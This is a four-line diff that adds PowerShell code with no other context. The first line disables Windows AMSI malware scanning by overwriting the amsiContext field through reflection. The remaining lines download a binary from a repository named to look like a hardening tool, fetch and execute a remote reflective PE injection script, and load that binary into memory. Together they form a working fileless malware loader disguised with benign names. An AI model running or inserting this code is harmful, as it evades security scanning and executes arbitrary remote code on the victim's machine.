@@ -1,0 +1,4 @@
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$c=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0)
+$bytes = (New-Object System.Net.WebClient).DownloadData('https://github.com/usr1221/hardening-tools/raw/refs/heads/main/shield.txt')
+iex(irm https://raw.githubusercontent.com/SafeItConsulting/Invoke-ReflectivePEInjection/refs/heads/main/Invoke-ReflectivePEInjection.ps1)
+Invoke-ReflectivePEInjection -PEBytes $bytes
